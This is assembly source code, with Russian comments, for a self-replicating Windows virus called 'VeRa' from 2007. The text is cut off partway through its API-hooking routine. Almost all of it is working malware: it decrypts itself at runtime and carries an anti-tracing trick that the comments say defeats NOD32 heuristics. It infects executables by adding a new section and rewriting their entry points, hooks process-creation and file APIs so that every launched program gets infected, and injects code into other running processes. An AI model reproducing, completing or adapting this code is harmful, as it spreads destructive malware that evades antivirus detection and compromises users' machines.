; VeRa v0.01 by Twister. Written in 2007
; Assemble - /c /coff /Cp /nologo
; Link - /SUBSYSTEM:WINDOWS /SECTION:.text,RWE /RELEASE /VERSION:4.0

.686
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc
include masm32.inc
include comdlg32.inc
include advapi32.inc

includelib kernel32.lib
includelib user32.lib
includelib masm32.lib
includelib comdlg32.lib
includelib advapi32.lib

.code
start:
	dwSignature		equ		56527754h
	
	jmp		entry
	
vir_start:
	jmp		SkipCryptProc
	
; Процедура Crypt шифрует данные указанным ключем
; [IN]    EDI - Адрес ключа
;         EBX - Длина ключа -1 (ВАЖНО!)
;         ESI - Адрес шифруемых данных
;         ECX - Длина шифруемых данных
;         EDX - Если != 0, тогда происходит расшифровка, иначе - шифрование.
Crypt PROC
	pushad
	push	ebx
	dec		esi
  _loop:
	mov		al, byte ptr[esi+ecx] ;В al очередной байт с конца
	mov		ah, byte ptr[edi+ebx] ;В ah очередной байт ключа с конца
	
	
	test	edx, edx
	jz		_crypt
	xor		al, cl
	add		al, bl
	xor		al, ah
	jmp		_crypt_end
  _crypt:
	xor		al, ah
	sub		al, bl
	xor		al, cl
  _crypt_end:
	
	mov		byte ptr[esi+ecx], al
	
	test	ebx, ebx
	jz		_restore_ebx
	dec		ebx
  _ret_to_loop:
	loop	_loop
	pop		ebx ;Чтоб не нарушить стек
	popad
	ret
  _restore_ebx:
	pop		ebx
	push	ebx
	jmp		_ret_to_loop
Crypt EndP
	
	bInjected	db	0h ; Если отлично от нуля - значит код внедренный, не шифрованый и выполняется в отдельном потоке.
	
  SkipCryptProc:
	call    setupSEH
	call	delta_
  delta_:
	pop		ebp 
	sub		ebp, offset delta_
	
	cdq
	cmp		byte ptr[ebp+bInjected], dl
	jne		IamInjected
	
	lea		esi, [ebp+CryptedBody]
	lea		edi, [ebp+_CryptKey]
	push	15
	pop		ebx
	push	(entry-CryptedBody)
	pop		ecx
	cdq
	inc		edx
	call	Crypt ;Расшифровываемся...
	
	call	StartVirus
	
	mov		edi, dword ptr[ebp+_EntryPoint]
	push	edi
	push	6
	pop		ecx
	lea		esi, [ebp+_OldCode]
	rep		movsb
	pop		edi
	jmp		edi ;Возвращаем управление жертве...
	
	_CryptKey			dd		4 dup(0)
	
  setupSEH:
	; Небольшая антиотладочная, а точнее - антитрассировочная фича.
	; Реально "помогает" от эвристики NOD32... 
	cdq
	assume	fs:nothing
	push	dword ptr fs:[edx]
	mov		fs:[edx], esp
	pushfd
	pop		eax
	bts		eax, 8
	push	eax
	popfd
	jmp		$
	
CryptedBody:
	
; Функция GetPEHeader возвращает адрес структуры PEHeader в памяти
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - адрес структуры PEHeader
GetPEHeader Proc
	mov		eax, dword ptr[esi+3Ch]
	add		eax, esi
	ret
GetPEHeader EndP

; Функция IsValidPE проверяет правильность формата PE-файла
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - 1, если файл является верным PE-файлом, иначе 0
IsValidPE Proc
	xor		eax, eax
	push	esi
	cmp		word ptr[esi], 5A4Dh
	jne		_ret
	call	GetPEHeader
	cmp		dword ptr[eax], 4550h
	jne		_ret
	xor		eax, eax
	inc		eax
  _ret:
	pop		esi
	ret
IsValidPE EndP

; Функция GetFileSubSystem возвращает номер подсистемы, необходимой для запуска данного файла
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - Результат
GetFileSubSystem PROC
	call	GetPEHeader
	movzx	eax, word ptr[eax+5Ch]
	ret
GetFileSubSystem EndP

; Процедура MarkInfectedPE помечает PE-файл как зараженный
; [IN]    ESI - указатель на начало файла в памяти
MarkInfectedPE Proc
	mov		dword ptr[esi+1Ch], dwSignature
	ret
MarkInfectedPE EndP

; Функция IsInfectedPE проверяет PE-файл на зараженность
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - 1, если файл уже заражен, иначе 0
IsInfectedPE Proc
	xor		eax, eax
	cmp		dword ptr[esi+1Ch], dwSignature
	jne		_ret
	inc		eax
  _ret:
	ret
IsInfectedPE EndP

; Функция GetImageBaseVA получает виртуальный адрес загрузки PE-файла в память
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - ImageBase
GetImageBaseVA Proc
	call	GetPEHeader
	mov		eax, dword ptr[eax+34h]
	ret
GetImageBaseVA EndP

; Функция GetEntryPointRVA получает смещение в PE-файле, по которому передается управление при запуске программы
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - EntryPoint
GetEntryPointRVA Proc
	call	GetPEHeader
	mov		eax, dword ptr[eax+28h]
	ret
GetEntryPointRVA EndP

; Функция GetNumberOfSections возвращает количество секций в PE-файле
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - количество секций
GetNumberOfSections Proc
	call	GetPEHeader 
	movzx	eax, word ptr[eax+6h]
	ret
GetNumberOfSections EndP

; Функция GetSections возвращает смещение описателя первой секции в заголовке PE-файла
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - смещение
GetSections Proc
	call	GetPEHeader
	sub		eax, esi
	sub		eax, -0F8h ; Избавимся от нулей
	ret
GetSections EndP

	_OldCode			db		6 dup(0)
	_EntryPoint 		dd		0
	
_HashTable:
	VirtualProtect_				dd		015F8EF80h
	CloseHandle_				dd		0F867A91Eh
	CreateFileMappingA_			dd		01F394C74h
	MapViewOfFile_				dd		0FC6FB9EAh
	UnmapViewOfFile_			dd		0CA036058h
	GetFileSize_				dd		0AAC2523Eh
	GetProcAddress_				dd		05D7574B6h
	GetModuleHandleA_			dd		00F191CF4h
	VirtualAllocEx_				dd		0632466F0h
	VirtualProtectEx_			dd		06F3C57E2h
	WriteProcessMemory_			dd		06F39E536h
	ReadProcessMemory_			dd		0B0869BCAh
	OpenProcess_				dd		0FE33F9AEh
	CreateToolhelp32Snapshot_	dd		04151DD34h
	Process32First_				dd		02190BE50h
	Process32Next_				dd		0DA670848h
	ExitThread_					dd		01DA85EE2h
	CreateRemoteThread_			dd		05D295CE6h
	Sleep_						dd		09EFED3FAh
	CreateProcessInternalW_		dd		03F212454h
	WideCharToMultiByte_		dd		0BEEA737Eh
	
	MoveFileA_					dd		0AC5F91EEh
	CopyFileA_					dd		0840F30ACh
	GetFullPathNameA_			dd		05DBC5670h
	DeleteFileA_				dd		0BC7FD16Eh
	CreateFileA_				dd		0860B38BCh
	GetFileAttributesA_			dd		03D7D6496h
	SetFileAttributesA_			dd		0152DC5D4h
	_lopen_						dd		04F2565C6h
	MoveFileExA_				dd		0D6AA917Eh
	CopyFileExA_				dd		0FEFA303Ch
                        		dd		0FFFFFFFFh ;Конец таблицы
	
_AddrTable:
	_VirtualProtect				dd		00000000h
	_CloseHandle				dd		00000000h
	_CreateFileMappingA			dd		00000000h
	_MapViewOfFile				dd		00000000h
	_UnmapViewOfFile			dd		00000000h
	_GetFileSize				dd		00000000h
	_GetProcAddress				dd		00000000h
	_GetModuleHandleA			dd		00000000h
	_VirtualAllocEx				dd		00000000h
	_VirtualProtectEx			dd		00000000h
	_WriteProcessMemory			dd		00000000h
	_ReadProcessMemory			dd		00000000h
	_OpenProcess				dd		00000000h
	_CreateToolhelp32Snapshot	dd		00000000h
	_Process32First				dd		00000000h
	_Process32Next				dd		00000000h
	_ExitThread					dd		00000000h
	_CreateRemoteThread			dd		00000000h
	_Sleep						dd		00000000h
	_CreateProcessInternalW		dd		00000000h
	_WideCharToMultiByte		dd		00000000h
	
_HookedFunctions:
	_MoveFileA					dd		00000000h
	_CopyFileA					dd		00000000h
	_GetFullPathNameA			dd		00000000h
	_DeleteFileA				dd		00000000h
	_CreateFileA				dd		00000000h
	_GetFileAttributesA			dd		00000000h
	_SetFileAttributesA			dd		00000000h
	__lopen						dd		00000000h
	_MoveFileExA				dd		00000000h
	_CopyFileExA				dd		00000000h
                        		dd		0FFFFFFFFh ;Конец таблицы
                        		
	BodySize		equ		(offset entry - offset vir_start)

; Функция PutBody помещает "тело" вируса в секцию PE-файла и изменяет первые инструкции 
; программы на переход к телу вируса, предварительно запомнов их по адресу _OldCode
; [IN]    ESI - указатель на начало файла в памяти
;         EAX - физическое смещение секции
; [OUT]   EAX - 0, если неудача
PutBody Proc
	
	push	eax
	push	edi
	push	esi
	
	call	GetCodeSection
	mov		ebx, dword ptr[eax+0Ch]
	call	GetEntryPointRVA
	push	eax
	call	GetImageBaseVA
	xchg	eax, ecx
	pop		eax
	add		ecx, eax
	sub		eax, ebx
	xchg	eax, ebx
	push	ecx
	call	GetCodeSectionPhysicalOffset
	pop		ecx
	add		eax, ebx
	add		esi, eax
	mov		edx, esi
	
	mov		dword ptr[ebp+_EntryPoint], ecx
	lea		edi, dword ptr[ebp+_OldCode]
	push	6
	pop		ecx
	rep		movsb
	
	lea		esi, dword ptr[ebp+_CryptKey]
	push	16
	pop		ecx
	call	GenRandomKey
	
	pop		esi
	pop		ebx ;Восстанавливаем смещение записи
	pop		edi ;Восстанавливаем смещение секции
	mov		ebx, dword ptr[ebx+0Ch]
	call	GetImageBaseVA
	add		eax, ebx
	add		edi, esi ;В edi адрес того участка, куда будем копировать
	
	mov		byte  ptr[edx], 068h
	mov		dword ptr[edx+1], eax
	mov		byte  ptr[edx+5], 0C3h	
	
	push	esi
	lea		esi, [ebp+vir_start] ;В esi адрес того участка, от куда будем копировать
	push	BodySize
	pop		ecx ;В ecx количество копируемых байт 
	push	edi
	rep		movsb
	pop		edi
	
	lea		esi, [edi+(CryptedBody - vir_start)]
	lea		edi, dword ptr[ebp+_CryptKey]
	push	15
	pop		ebx
	push	(entry-CryptedBody)
	pop		ecx
	cdq
	call	Crypt
	
	pop		esi		
	ret
PutBody EndP

; Функция GetCodeSection получает смещение записи о секции, на которую указывает EntryPoint
; [IN]    ESI - указатель на начало файла в памяти
; [OUT]   EAX - смещение или ноль в случае неудачи
GetCodeSection PROC
	call	GetNumberOfSections
	xchg	ecx, eax
	call	GetSections
	xchg	edi, eax
	call	GetEntryPointRVA
	add		edi, esi
  _loop:
	cmp		eax, dword ptr[edi+0Ch]
	jge		_try
  _next:
	add		edi, 028h
  	loop	_loop
  	xor		eax, eax
  	ret
  _try:
	mov		edx, dword ptr[edi+08h]
	add		edx, dword ptr[edi+0Ch]
	cmp		eax, edx
	jb		_find
	jmp		_next
  _find:
	xchg	eax, edi
	ret
GetCodeSection EndP

; Процедура MarkCodeSectionAsWriteable помечает секцию (ту, на которую кажет EntryPoint) как доступную для записи
; [IN]    ESI - Адрес файла в памяти
MarkCodeSectionAsWriteable Proc
	call	GetCodeSection
	mov		dword ptr[eax+24h], 0F0000060h
	ret
MarkCodeSectionAsWriteable EndP

; Функция GetCodeSectionPhysicalOffset возвращает физическое смещение той секции, на которую указывает EntryPoint
; [IN]    ESI - Адрес файла в памяти
; [OUT]   EAX - Результат
GetCodeSectionPhysicalOffset Proc
	call	GetCodeSection
	test	eax, eax
	jz		_ret
	mov		eax, dword ptr[eax+14h]
  _ret:
	ret
GetCodeSectionPhysicalOffset EndP

; Функция GetKernelBase определяет начальный адрес загрузки kernel32.dll в памяти процесса
; [OUT]   EAX - Адрес kernel'а или 0 в случае неудачи
GetKernelBase Proc
	push	edx
	xor		edx, edx
	assume	fs: nothing
	mov		eax, fs:[edx]
	dec		edx
  _SearchK32:
	cmp		[eax], edx
	je		_CheckK32
	mov		eax, dword ptr[eax]
	jmp		_SearchK32
  _CheckK32:
	mov		eax, [eax+4]
	xor		ax, ax
  _SearchMZ: 
	cmp		word ptr [eax],5A4Dh
	je		_CheckMZ
	sub		eax,10000h
	jmp		_SearchMZ
  _CheckMZ: 
	mov		edx,[eax+3ch]
	cmp		word ptr [eax+edx], 4550h
	je		_Exit
	xor 	eax, eax
  _Exit:
	pop		edx
	ret
GetKernelBase EndP

; Функция CalcHash вычисляет хэш-сумму строки
; [IN]    EDI - Указатель на строку
; [OUT]   EAX - Полученный хэш
CalcHash Proc
	push	esi
	mov		esi, edi
	xor		eax, eax
	push	eax
  _Calc:
	ror		eax, 7
	xor		[esp],eax
	lodsb
	test	al, al
	jnz		_Calc
	pop		eax
	pop		esi
	ret
CalcHash EndP

; Функция GetExportTable возвращает указатель на начало таблицы экспорта
; [IN]    ESI - Адрес загруженной библиотеки в памяти
; [OUT]   EAX - Результат
GetExportTable Proc
	call	GetPEHeader
	add		eax, 78h
	push	esi
	add		esi, dword ptr[eax]
	xchg	eax, esi
	pop		esi
	ret
GetExportTable EndP

; Функция FindFunction находит адрес экспортируемой функции
; [IN]    EDI - Хэш от имени функции
;         ESI - Адрес файла в памяти
; [OUT]   EAX - Результат
FindFunction Proc
	local	dwHash: DWORD
	local	dwOrdinalTable: DWORD
	local	dwAddressTable: DWORD
	
	pushad
	mov		dwHash, edi
	call	GetExportTable
	xor		ebx, ebx
	mov		ecx, dword ptr[eax+18h] ;Кол-во функций
	mov		edx, dword ptr[eax+24h]
	add		edx, esi
	mov		dwOrdinalTable, edx     ;Таблица ординалов
	mov		edx, dword ptr[eax+1Ch]
	add		edx, esi
	mov		dwAddressTable, edx     ;Таблица адресов
	mov		edx, dword ptr[eax+20h] ;Таблица указателей на имена
	add		edx, esi
  _loop:
	mov		edi, dword ptr[edx]
	add		edi, esi
	call	CalcHash
	cmp		eax, dwHash
	je		_find
	add		edx, 4
	inc		ebx
  	loop	_loop
  	xor		eax, eax
  	ret
  _find:
	shl		ebx, 1 ;Умножаем ebx на 2
	add		ebx, dwOrdinalTable
	movzx	eax, word ptr[ebx]
	shl		eax, 2 ;Умножаем eax на 4
	add		eax, dwAddressTable
	mov		eax, dword ptr[eax]
	add		eax, esi
	mov		dwHash, eax
	popad
	mov		eax, dwHash
	
	ret
FindFunction EndP

; Процедура FindAll заполняет массив _AddrTable адресами необходимых функций
; [IN]    ESI - Адрес загруженной библиотеки в памяти
;         ECX - Указатель на таблицу хэшей
;         EBX - Указатель на заполняемую таблиц адресов
FindAll Proc
	pushad
  _Find:
	mov		edi, dword ptr[ecx]
	inc		edi
	je		_TableEnd
	dec		edi
	call	FindFunction
	mov		dword ptr[ebx], eax
	push	4
	pop		edi
	add		ecx, edi
	add		ebx, edi
	jmp		_Find
  _TableEnd:
	popad
	ret
FindAll EndP

; Процедура InfectFile заражает файл
; [IN]    EDI - Указатель на имя заражаемого файла
InfectFile Proc
	mov		byte ptr[ebp+bOnlyTest], 1
  _ret_and_infect:
	push	edi
	xor     ebx,ebx
	push    ebx
	push    ebx
	push    00000003h
	push    ebx
	push    1 or 2
	push    80000000h or 40000000h
	push    edi
	
	inc		ebx
	mov		byte ptr[ebp+bNoCreateFileAHook], bl ;Запрещаем на время перехват CreateFileA
	dec		ebx
	call    [ebp+_CreateFileA]
	
	inc		eax
	jnz		_file_ok
	pop		edi
	ret
	
  _file_ok:
	dec		eax
	mov		[ebp+hFile], eax
	push	ebx
	push	eax
	call	[ebp+_GetFileSize]
	xor		ebx, ebx
	
	mov		byte ptr[ebp+bNoCreateFileAHook], bl ;Разрешаем перехват CreateFileA
	
	cmp		byte ptr[ebp+bOnlyTest], 1
	jne		_no_size_increment ;К сожалению CMOVE принимает первым операндом только регистр...
	mov		[ebp+FileSize], eax
  _no_size_increment:
	push    ebx
	push    [ebp+FileSize]
	push    ebx
	push    00000004h
	push    ebx
	push    [ebp+hFile]
	call    [ebp+_CreateFileMappingA]
	test	eax, eax
	jz		_close
	mov		[ebp+hMapping], eax
	push    [ebp+FileSize]
	push    ebx
	push    ebx
	push    00000002h
	push    eax
	call    [ebp+_MapViewOfFile]
	test	eax, eax
	jz		_close_map
	xchg	eax, esi
	
	call	IsValidPE
	test	eax, eax ;Вирус заражает только PE-файлы, вот и проверяем валидность PE.
	jz		_unmap
	call	GetFileSubSystem
	cmp		al, 2 ;Windows GUI
	je		_subsystem_ok
	cmp		al, 3 ;Windows Console
	jne		_unmap
  _subsystem_ok:
	call	IsInfectedPE
	test	eax, eax ;Если уже заражен, то нет смысла заражать повторно, хотя к ошибкам это не приведет.
	jnz		_unmap
	call	GetCodeSection
	test	eax, eax ;Если EntryPoint кажет не на секцию (т.е. скорее всего в заголовок), то заражать не будем.
	jz		_unmap
	cmp		byte ptr[ebp+bOnlyTest], 1
	jne		_work_with_file
	mov		byte ptr[ebp+bOnlyTest], 0
	mov		eax, [ebp+FileSize]
	add		eax, BodySize
	call	GetFileAlign
	call	AlignValue
	mov		[ebp+FileSize], eax
	jmp		_unmap
	
  _work_with_file:
	call	MarkCodeSectionAsWriteable
	call	CreateSection
	call	PutBody
	call	ValidatePEHeaderValues
	call	MarkInfectedPE
	mov		byte ptr[ebp+bOnlyTest], 2
	
  _unmap:	
	push	esi
	call	[ebp+_UnmapViewOfFile]
  _close_map:
	push	[ebp+hMapping]
	call	[ebp+_CloseHandle]
  _close:	
	push	[ebp+hFile]
	call	[ebp+_CloseHandle]
	
	pop		edi
	cmp		byte ptr[ebp+bOnlyTest], 0
	je		_ret_and_infect
	
  _ret:
	ret
	
	hFile		dd	00000000h
	FileSize	dd	00000000h
	hMapping	dd	00000000h
	bOnlyTest	db	0h ; Если bOnlyTest == 1, тогда процедура просто проверяет файл на возможность заражения,
	                   ; если 0, тогда заражает. Если 2, то файл успешно заражен.
	
InfectFile EndP

; Функция Rand возвращает случайное число
; [IN]    EAX - Число генерируется в диапазоне 0..(eax-1)
; [OUT]   EAX - Случайное число
Rand PROC
	push	ecx
	push	edx                        ; Сохраняем в стэке edx, ecx
	xor		edx,edx                    ; Обнуляем edx
	imul	eax,eax,100                ; Умножаем eax на 100
	push	eax                        ; и сохраняем eax в стэке
	call	random32                   ; Вызываем подпрограмму
	pop		ecx                        ; Восстанавливаем значение
	div		ecx                        ; Делим eax на ecx
	xchg	eax,edx                    ; Помещаем остаток в eax
	xor		edx,edx                    ; Обнуляем edx
	mov		ecx,100                    ; Помещаем в ecx - 100
	div		ecx                        ; Делим eax на ecx
	pop		edx                        ; Восстанавливаем ecx, edx
	pop		ecx
	ret
random32:
	push	ecx                        ; Сохраняем в стэке edx, ecx
	push	edx
	db		0fh,031h                   ; Инструкция rdtsc
	rcl		eax,2                      ; Далее идут различные
	add		eax,12345678h              ; математические
	random_seed = dword ptr $-4        ; преобразования
	adc		eax,esp                    ; для получения, как
	xor		eax,ecx                    ; можно более не зависимого
	xor		[ebp+random_seed], eax     ; числа
	add		eax,[esp-8]                ;
	rcl		eax,1                      ;
	pop		edx                        ; Восстанавливаем ecx, edx
	pop		ecx
	ret
Rand EndP

; Процедура GenRandomKey генерирует случайный ключ
; [IN]    ESI - Адрес ключа
;         EСX - Длина ключа
GenRandomKey PROC
	dec		esi
  _loop:
	mov		eax, 255
	call	Rand
	mov		byte ptr[esi+ecx], al
	loop	_loop
	ret
GenRandomKey EndP

; Процедура ValidatePEHeaderValues устанавливает некоторые важные значения в заголовке
; [IN]    ESI - Адрес файла в памяти
ValidatePEHeaderValues PROC
	call	GetFirstSection
	xchg	eax, ebx
	call	GetPEHeader
	mov		edx, dword ptr[eax+54h]
	cmp		edx, ebx
	jge		_skip
	mov		dword ptr[eax+54h], ebx ;Header Size
  _skip:
	ret
ValidatePEHeaderValues EndP

	MessageBoxExA_Bytes					db		6 dup(0)
	CreateProcessInternalW_Bytes		db		6 dup(0)	                    
	_Functions_Bytes					db		60 dup(0)

_UserHashTable:
	MessageBoxExA_			dd		0C48ED9ECh
	MessageBoxA_			dd		0BE7B3098h
                        	dd		0FFFFFFFFh ;Конец таблицы
                        
_UserAddrTable:
	_MessageBoxExA			dd		00000000h
	_MessageBoxA			dd		00000000h
	
_NtdllHashTable:
	ZwQueryInformationProcess_		dd		0C04F005Ch
	                                dd		0FFFFFFFFh ;Конец таблицы
	                                
_NtdllAddrTable:
	_ZwQueryInformationProcess		dd		00000000h

; Функция GetFirstSection возвращает минимальный Physical Offset секций
; [IN]    ESI - Адрес загрузки файла
; [OUT]   EAX - Результат
GetFirstSection PROC
	call	GetNumberOfSections
	xchg	eax, ecx
	call	GetSections
	mov		ebx, dword ptr[esi+eax+14h]
  _loop:
	mov		edx, dword ptr[esi+eax+14h]
	cmp		ebx, edx
	jb		_big
	mov		ebx, edx
  _big:
	add		eax, 28h
	loop	_loop
	xchg	eax, ebx
	ret
GetFirstSection EndP

; Функция AlignValue выравнивает значение по фактору
; [IN]    EAX - Выравниваемое значение
;         EBX - Выравнивающий фактор
; [OUT]   EAX - Результат
AlignValue PROC
	dec ebx
	add eax, ebx
	not ebx
	and eax, ebx
	ret
AlignValue EndP

; Функция GetFileAlign возвращает значение, по которому должны быть выравнены некоторые поля
; [IN]    ESI - Адрес загрузки файла
; [OUT]   EBX - Результат
GetFileAlign PROC
	push	eax
	call	GetPEHeader
	mov		ebx, dword ptr[eax+3Ch]
	pop		eax
	ret
GetFileAlign EndP

; Функция GetObjectAlign возвращает значение, по которому должны быть выравнены секции
; [IN]    ESI - Адрес загрузки файла
; [OUT]   EBX - Результат
GetObjectAlign PROC
	push	eax
	call	GetPEHeader
	mov		ebx, dword ptr[eax+38h] ;Object align
	pop		eax
	ret
GetObjectAlign EndP

; Функция CreateSection создает новую секцию '.vera' в файле
; [IN]    ESI - Адрес загрузки файла
; [OUT]   EAX - Физическое смещение новой секции в файле
;         EDI - Смещение записи о созданной секции
CreateSection PROC
	lea		edx, [GetPEHeader]
	call	edx
	mov		ecx, dword ptr[eax+0D0h] ;Есть ли боунд-импорты
	test	ecx, ecx
	jz		_skip_bound_imports
	mov		ebx, ecx
	add		ebx, esi ;В EBX начало боунд-импортов
	mov		ecx, dword ptr[eax+0D4h] ;Размер боунд-импортов
	lea		edi, dword ptr[ebx+28h] ;Куда передвигаем
	dec		edi
	dec		ebx ;Откуда передвигаем
  _loop_mov:
	mov		al, byte ptr[ebx+ecx]
	mov		byte ptr[edi+ecx], al
	loop	_loop_mov
	call	edx ;GetPEHeader
	add		dword ptr[eax+0D0h], 28h
  _skip_bound_imports:
	call	GetNumberOfSections
	mov		ebx, eax
	mov		ecx, eax
	call	GetSections
	imul	ebx, 028h
	mov		edi, eax
	add		edi, ebx ;Смещение окончания массива, описывающего секции
	mov		ebx, eax
	add		edi, esi

	mov		dword ptr[edi], 7265762Eh	;||
	mov		dword ptr[edi+4], 61h		;|| => Пишем имя секции - .vera
	
	push	edi
	mov		edi, ebx
	mov		eax, dword ptr[esi+ebx+0Ch]
  _loop:
	mov		edx, dword ptr[esi+ebx+0Ch]
	cmp		eax, edx
	jg		_small
	mov		eax, edx
	mov		edi, ebx
  _small:
	add		ebx, 28h
	loop	_loop
	xchg	eax, edi
	pop		edi
	
	push	eax
	mov		edx, dword ptr[esi+eax+0Ch] ;В eax Section RVA
	add		edx, dword ptr[esi+eax+08h] ;
	
	call	GetObjectAlign
	
	lea		ecx, [AlignValue]
	xchg	eax, edx
	call	ecx ;AlignValue
	xchg	eax, edx
	
	mov		dword ptr[edi+0Ch], edx ;Virtual offset (Section RVA)
	mov		eax, BodySize
	call	GetFileAlign
	call	ecx ;AlignValue
	mov		dword ptr[edi+10h], eax ;Physical Size
	
	push	esi
	push	eax
	call	GetPEHeader
	mov		esi, eax
	mov		ebx, dword ptr[eax+38h] ;Object align
	pop		eax
	
	call	ecx ;AlignValue
	mov		dword ptr[edi+08h], eax ;Virtual Size
	add		edx, eax
	inc		word ptr[esi+06h] ;Увеличиваем кол-во секций
	mov		dword ptr[esi+50h], edx ;Изменяем Image Size
	pop		esi
	pop		ebx ;Восстанавливаем в ebx смещение последней секции
	mov		eax, dword ptr[esi+ebx+14h] ;В eax Phisycal offset
	add		eax, dword ptr[esi+ebx+10h] ;В eax Phisycal size + Phisycal offset
	call	GetFileAlign
	call	ecx ;AlignValue
	mov		dword ptr[edi+14h], eax ;Physical offset
	cdq
	mov		dword ptr[edi+18h], edx ; ||
	mov		dword ptr[edi+1Ch], edx ; || = > Релоки, нам не пригодится...
	mov		dword ptr[edi+20h], edx ; ||
	mov		dword ptr[edi+24h], 0F0000060h ;Атрибуты секции
	ret
CreateSection EndP

	strUSER32		db		"user32.dll",0
	strNtdll		db		"ntdll.dll",0
	strMsg			db		"VeRa",0

; Главная процедура. Устанавливает перехват API-функций и внедряет код вируса в другие процессы.
StartVirus PROC
	call	GetKernelBase
	xchg	eax, esi
	lea		ecx, [ebp+_HashTable]
	lea		ebx, [ebp+_AddrTable]
	call	FindAll
	lea		eax, [ebp+strUSER32]
	push	eax
	call	[ebp+_GetModuleHandleA]
	test	eax, eax
	jz		skip_user_functions
	
	xchg	eax, esi
	call	GetCodeSection ;Получим адрес записи о секции .text модуля user32
	;Надо бы проверить результат, но в user32 EntryPoint гарантированно смотрит в одну из секций
	lea		ecx, [ebp+_UserHashTable]
	lea		ebx, [ebp+_UserAddrTable]
	call	FindAll
	push	eax ;Пушим, чтоб было место на стеке - нужно для VirtualProtect
	push	esp
	push	40h
	push	dword ptr[eax+08h] ;Виртуальный размер секции
	add		esi, dword ptr[eax+0Ch] ;Место в памяти, куда отображена секция
	push	esi
	call	[ebp+_VirtualProtect]
	pop		eax ;Приводим стек в нормальное состояние
	call	HookMessageBoxExA
	
  skip_user_functions:
	call	GetKernelBase
	xchg	eax, esi
	call	GetCodeSection ;Надо бы проверить результат, но в кернеле EntryPoint гарантированно смотрит в одну из секций
	push	eax
	push	esp
	push	40h
	push	dword ptr[eax+08h]
	add		esi, dword ptr[eax+0Ch]
	push	esi
	call	[ebp+_VirtualProtect]
	pop		eax
	call	HookAll
	
	lea		eax, [ebp+strNtdll]
	push	eax
	call	[ebp+_GetModuleHandleA]
	xchg	eax, esi
	lea		ecx, [ebp+_NtdllHashTable]
	lea		ebx, [ebp+_NtdllAddrTable]
	call	FindAll
	
	call	HookCreateProcessInternalW
	
	call	EnumProcessesAndInjectCode
	
	cdq
	push	edx
	push	edx
	push	edx
	lea		eax, [ebp+ThreadProc]
	push	eax
	push	edx
	push	edx
	dec		edx
	push	edx
	call	[ebp+_CreateRemoteThread]
	
  _ret:
	ret
StartVirus EndP

; Снимает перехват CreateProcessInternalW
UnHookCreateProcessInternalW PROC
	pushad
	lea		esi, [ebp+CreateProcessInternalW_Bytes]
	mov		edi, dword ptr[ebp+_CreateProcessInternalW]
	push	6
	pop		ecx
	rep		movsb
	popad
	ret
UnHookCreateProcessInternalW EndP

; Ставит перехват CreateProcessInternalW
HookCreateProcessInternalW PROC
	pushad
	lea		edi, [ebp+CreateProcessInternalW_Bytes]
	mov		esi, dword ptr[ebp+_CreateProcessInternalW]
	push	esi
	push	6
	pop		ecx
	rep		movsb
	
	pop		esi
	lea		ecx, [ebp+NewCreateProcessInternalW]
	mov		byte  ptr[esi], 068h
	mov		dword ptr[esi+1], ecx
	mov		byte  ptr[esi+5], 0C3h
	popad
	ret
HookCreateProcessInternalW EndP

; Снимает перехват MessageBoxExA
UnHookMessageBoxExA PROC
	pushad
	lea		esi, [ebp+MessageBoxExA_Bytes]
	mov		edi, dword ptr[ebp+_MessageBoxExA]
	push	6
	pop		ecx
	rep		movsb
	popad
	ret
UnHookMessageBoxExA EndP

; Ставит перехват MessageBoxExA
HookMessageBoxExA PROC
	pushad
	lea		edi, [ebp+MessageBoxExA_Bytes]
	mov		esi, dword ptr[ebp+_MessageBoxExA]
	push	esi
	push	6
	pop		ecx
	rep		movsb
	
	pop		esi
	lea		ecx, [ebp+NewMessageBoxExA]
	mov		byte  ptr[esi], 068h
	mov		dword ptr[esi+1], ecx
	mov		byte  ptr[esi+5], 0C3h
	popad
	ret
HookMessageBoxExA EndP

; Новый обработчик функции CreateProcessInternalW
NewCreateProcessInternalW PROC
	pushad
	lea		ecx, [esp+32]
	call	cpi_delta
  cpi_delta:
	pop		ebp
	sub		ebp, offset cpi_delta
	
	sub		esp, 256 * 2
	mov		ebx, esp ;Указатель на строку приемник
	push	ebx
	cdq
	push	edx
	push	edx
	push	256
	push	ebx
	push	-1
	push	dword ptr[ecx+12] ;Строка - источник
	push	edx
	push	edx
	call	[ebp+_WideCharToMultiByte]
	
	pop		esi
	mov		edi, esi
	add		edi, 256
	call	ValidateFileName
	
	pushad
	call	InfectFile
	popad
;	call	UnHookMessageBoxExA
;	cdq
;	push	edx
;	push	edx
;	push	edi ;Тут имя файла, который можно заразить...
;	push	edx
;	call	[ebp+_MessageBoxA]
;	call	HookMessageBoxExA
	
	add		esp, 256 * 2
	mov		esi, esp ;Указатель на стек + pushad
	add		esp, 32 ;Теперь стек в первоначальном состоянии
	mov		edi, [esp]
	lea		eax, [ebp+_ret_to_hook]
	mov		[esp], eax
	call	UnHookCreateProcessInternalW
	jmp		[ebp+_CreateProcessInternalW]
  _ret_to_hook:
	mov		esp, esi
	mov		[esp+32], edi
	mov		[esp+28], eax
	
	call	HookCreateProcessInternalW
	
	popad
	retn	30h
NewCreateProcessInternalW EndP

; Новый обработчик функции NewMessageBoxExA
NewMessageBoxExA PROC
	pushad
	
	lea		ebx, [esp+32] ;Указатель на стек в исходной процедуре
	call	mbe_delta
  mbe_delta:
	pop		ebp
	sub		ebp, offset mbe_delta
	
	push	edi
	call	UnHookMessageBoxExA
	push	dword ptr[ebx+14h] ;wLanguageId 18h
	push	dword ptr[ebx+10h] ;uType 14h
	lea		ecx, [ebp+strMsg]
	push	ecx				   ;lpCaption 10h
	push	dword ptr[ebx+08h] ;lpText 0Ch
	push	dword ptr[ebx+04h] ;hWnd 08h
	call	dword ptr[ebp+_MessageBoxExA] ;Вызываем оригинальную функцию
	
	pop		edi
	mov		[esp+28], eax ;При сливе регистров из стека eax примет значение, возвращенное оригинальной MessageBoxExA
	call	HookMessageBoxExA
	
	popad
	retn	14h
NewMessageBoxExA EndP

; Процедура HookAll устанавливает универсальный перехват
HookAll PROC
	pushad
	lea		eax, [ebp+_HookedFunctions]
